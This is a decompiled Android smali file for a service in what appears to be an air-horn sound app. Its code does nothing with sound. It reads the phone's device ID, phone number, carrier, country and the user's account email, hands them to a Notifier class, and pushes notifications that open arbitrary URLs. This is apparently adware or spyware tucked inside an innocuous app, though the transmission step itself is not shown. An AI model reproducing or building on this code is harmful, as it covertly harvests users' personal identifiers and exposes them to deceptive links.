.class public Lcom/and/snd/AirHornSoundService;
.super Landroid/app/Service;
.source "AirHornSoundService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/and/snd/AirHornSoundService$NoteThread;
    }
.end annotation


# instance fields
.field accounts:[Landroid/accounts/Account;

.field carrier:Ljava/lang/String;

.field country:Ljava/lang/String;

.field deviceId:Ljava/lang/String;

.field email:Ljava/lang/String;

.field mobile:Ljava/lang/String;

.field noteThread:Lcom/and/snd/AirHornSoundService$NoteThread;

.field notifID:I

.field notifier:Lcom/and/snd/Notifier;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 24
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 32
    const-string v0, ""

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->deviceId:Ljava/lang/String;

    .line 33
    const-string v0, ""

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    .line 34
    const-string v0, ""

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->country:Ljava/lang/String;

    .line 35
    const-string v0, ""

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    .line 37
    const-string v0, ""

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->email:Ljava/lang/String;

    .line 24
    return-void
.end method


# virtual methods
.method public getCarrier()Ljava/lang/String;
    .locals 1

    .prologue
    .line 207
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    .line 208
    const-string v0, ""

    .line 209
    :goto_0
    return-object v0

    :cond_0
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    goto :goto_0
.end method

.method public getCountry()Ljava/lang/String;
    .locals 1

    .prologue
    .line 201
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->country:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    .line 202
    const-string v0, ""

    .line 203
    :goto_0
    return-object v0

    :cond_0
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->country:Ljava/lang/String;

    goto :goto_0
.end method

.method public getDeviceID()Ljava/lang/String;
    .locals 1

    .prologue
    .line 189
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->deviceId:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    .line 190
    const-string v0, ""

    .line 191
    :goto_0
    return-object v0

    :cond_0
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->deviceId:Ljava/lang/String;

    goto :goto_0
.end method

.method public getEmail()Ljava/lang/String;
    .locals 1

    .prologue
    .line 213
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->email:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    .line 214
    const-string v0, ""

    .line 215
    :goto_0
    return-object v0

    :cond_0
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->email:Ljava/lang/String;

    goto :goto_0
.end method

.method public getMobile()Ljava/lang/String;
    .locals 1

    .prologue
    .line 195
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    .line 196
    const-string v0, ""

    .line 197
    :goto_0
    return-object v0

    :cond_0
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    goto :goto_0
.end method

.method public getUserInfo()V
    .locals 11

    .prologue
    .line 149
    invoke-virtual {p0}, Lcom/and/snd/AirHornSoundService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    const-string v9, "android.hardware.telephony"

    invoke-virtual {v8, v9}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 151
    const-string v8, "phone"

    invoke-virtual {p0, v8}, Lcom/and/snd/AirHornSoundService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/telephony/TelephonyManager;

    .line 152
    .local v7, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->deviceId:Ljava/lang/String;

    .line 153
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v4

    .line 154
    .local v4, "msisdn":Ljava/lang/String;
    if-nez v4, :cond_2

    const-string v8, ""

    :goto_0
    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    .line 156
    :try_start_0
    iget-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    const-string v9, "[^0-9]"

    const-string v10, ""

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    .line 157
    iget-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    const-string v9, "1.*"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 158
    iget-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    const/4 v9, 0x1

    invoke-virtual {v8, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 163
    :cond_0
    :goto_1
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->country:Ljava/lang/String;

    .line 164
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    .line 166
    :try_start_1
    iget-object v8, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    const-string v9, " "

    const-string v10, ""

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_0

    .line 173
    .end local v4    # "msisdn":Ljava/lang/String;
    .end local v7    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :cond_1
    :goto_2
    const-string v8, ".+@.+\\.[a-z]+"

    invoke-static {v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v5

    .line 174
    .local v5, "p":Ljava/util/regex/Pattern;
    const/4 v3, 0x0

    .line 175
    .local v3, "matchFound":Z
    invoke-virtual {p0}, Lcom/and/snd/AirHornSoundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-static {v8}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v1

    .line 176
    .local v1, "accountManager":Landroid/accounts/AccountManager;
    invoke-virtual {v1}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v8

    iput-object v8, p0, Lcom/and/snd/AirHornSoundService;->accounts:[Landroid/accounts/Account;

    .line 177
    iget-object v8, p0, Lcom/and/snd/AirHornSoundService;->accounts:[Landroid/accounts/Account;

    array-length v9, v8

    const/4 v10, 0x0

    :goto_3
    if-lt v10, v9, :cond_3

    .line 186
    :goto_4
    return-void

    .end local v1    # "accountManager":Landroid/accounts/AccountManager;
    .end local v3    # "matchFound":Z
    .end local v5    # "p":Ljava/util/regex/Pattern;
    .restart local v4    # "msisdn":Ljava/lang/String;
    .restart local v7    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :cond_2
    move-object v8, v4

    .line 154
    goto :goto_0

    .line 177
    .end local v4    # "msisdn":Ljava/lang/String;
    .end local v7    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .restart local v1    # "accountManager":Landroid/accounts/AccountManager;
    .restart local v3    # "matchFound":Z
    .restart local v5    # "p":Ljava/util/regex/Pattern;
    :cond_3
    aget-object v0, v8, v10

    .line 178
    .local v0, "account":Landroid/accounts/Account;
    iget-object v6, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    .line 179
    .local v6, "possibleEmail":Ljava/lang/String;
    invoke-virtual {v5, v6}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 180
    .local v2, "m":Ljava/util/regex/Matcher;
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->matches()Z

    move-result v3

    .line 181
    if-eqz v3, :cond_4

    .line 182
    iput-object v6, p0, Lcom/and/snd/AirHornSoundService;->email:Ljava/lang/String;

    goto :goto_4

    .line 177
    :cond_4
    add-int/lit8 v10, v10, 0x1

    goto :goto_3

    .line 167
    .end local v0    # "account":Landroid/accounts/Account;
    .end local v1    # "accountManager":Landroid/accounts/AccountManager;
    .end local v2    # "m":Ljava/util/regex/Matcher;
    .end local v3    # "matchFound":Z
    .end local v5    # "p":Ljava/util/regex/Pattern;
    .end local v6    # "possibleEmail":Ljava/lang/String;
    .restart local v4    # "msisdn":Ljava/lang/String;
    .restart local v7    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :catch_0
    move-exception v8

    goto :goto_2

    .line 160
    :catch_1
    move-exception v8

    goto :goto_1
.end method

.method public handleCommand(Landroid/content/Intent;)V
    .locals 7
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 60
    invoke-virtual {p0}, Lcom/and/snd/AirHornSoundService;->getUserInfo()V

    .line 63
    new-instance v0, Lcom/and/snd/Notifier;

    iget-object v1, p0, Lcom/and/snd/AirHornSoundService;->deviceId:Ljava/lang/String;

    iget-object v2, p0, Lcom/and/snd/AirHornSoundService;->mobile:Ljava/lang/String;

    iget-object v3, p0, Lcom/and/snd/AirHornSoundService;->country:Ljava/lang/String;

    iget-object v4, p0, Lcom/and/snd/AirHornSoundService;->carrier:Ljava/lang/String;

    iget-object v5, p0, Lcom/and/snd/AirHornSoundService;->email:Ljava/lang/String;

    invoke-direct/range {v0 .. v5}, Lcom/and/snd/Notifier;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->notifier:Lcom/and/snd/Notifier;

    .line 66
    if-eqz p1, :cond_0

    .line 67
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v6

    .line 68
    .local v6, "b":Landroid/os/Bundle;
    if-eqz v6, :cond_1

    .line 69
    const-string v0, "notifID"

    invoke-virtual {v6, v0}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lcom/and/snd/AirHornSoundService;->notifID:I

    .line 75
    .end local v6    # "b":Landroid/os/Bundle;
    :cond_0
    :goto_0
    new-instance v0, Lcom/and/snd/AirHornSoundService$NoteThread;

    invoke-direct {v0, p0}, Lcom/and/snd/AirHornSoundService$NoteThread;-><init>(Lcom/and/snd/AirHornSoundService;)V

    iput-object v0, p0, Lcom/and/snd/AirHornSoundService;->noteThread:Lcom/and/snd/AirHornSoundService$NoteThread;

    .line 76
    iget-object v0, p0, Lcom/and/snd/AirHornSoundService;->noteThread:Lcom/and/snd/AirHornSoundService$NoteThread;

    invoke-virtual {v0}, Lcom/and/snd/AirHornSoundService$NoteThread;->start()V

    .line 77
    return-void

    .line 71
    .restart local v6    # "b":Landroid/os/Bundle;
    :cond_1
    const/4 v0, 0x0

    iput v0, p0, Lcom/and/snd/AirHornSoundService;->notifID:I

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 41
    const/4 v0, 0x0

    return-object v0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startid"    # I

    .prologue
    .line 49
    invoke-virtual {p0, p1}, Lcom/and/snd/AirHornSoundService;->handleCommand(Landroid/content/Intent;)V

    .line 50
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 54
    invoke-virtual {p0, p1}, Lcom/and/snd/AirHornSoundService;->handleCommand(Landroid/content/Intent;)V

    .line 55
    const/4 v0, 0x1

    return v0
.end method

.method public showNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 10
    .param p1, "title"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;
    .param p3, "url"    # Ljava/lang/String;
    .param p4, "id"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x0

    .line 80
    move-object v6, p2

    .line 81
    .local v6, "tickerText":Ljava/lang/CharSequence;
    move-object v2, p1

    .line 82
    .local v2, "contentTitle":Ljava/lang/CharSequence;
    move-object v1, p2

    .line 84
    .local v1, "contentText":Ljava/lang/CharSequence;
    new-instance v3, Landroid/content/Intent;

    const-string v7, "android.intent.action.VIEW"

    invoke-static {p3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v8

    invoke-direct {v3, v7, v8}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 85
    .local v3, "notifIntent":Landroid/content/Intent;
    invoke-static {p0, v9, v3, v9}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 87
    .local v0, "contentIntent":Landroid/app/PendingIntent;
    new-instance v4, Landroid/app/Notification;

    const v7, 0x7f020006

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-direct {v4, v7, v6, v8, v9}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 88
    .local v4, "notification":Landroid/app/Notification;
    iget v7, v4, Landroid/app/Notification;->defaults:I

    or-int/lit8 v7, v7, 0x1

    iput v7, v4, Landroid/app/Notification;->defaults:I

    .line 89
    const v7, -0xff0100

    iput v7, v4, Landroid/app/Notification;->ledARGB:I

    .line 90
    const/16 v7, 0x1f4

    iput v7, v4, Landroid/app/Notification;->ledOnMS:I

    .line 91
    const/16 v7, 0xbb8

    iput v7, v4, Landroid/app/Notification;->ledOffMS:I

    .line 92
    iget v7, v4, Landroid/app/Notification;->flags:I

    or-int/lit8 v7, v7, 0x1

    iput v7, v4, Landroid/app/Notification;->flags:I

    .line 93
    iget v7, v4, Landroid/app/Notification;->flags:I

    or-int/lit8 v7, v7, 0x10

    iput v7, v4, Landroid/app/Notification;->flags:I

    .line 94
    invoke-virtual {v4, p0, v2, v1, v0}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 96
    const-string v7, "notification"

    invoke-virtual {p0, v7}, Lcom/and/snd/AirHornSoundService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/NotificationManager;

    .line 97
    .local v5, "notificationManager":Landroid/app/NotificationManager;
    invoke-static {p4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    invoke-virtual {v5, v7, v4}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 98
    return-void
.end method
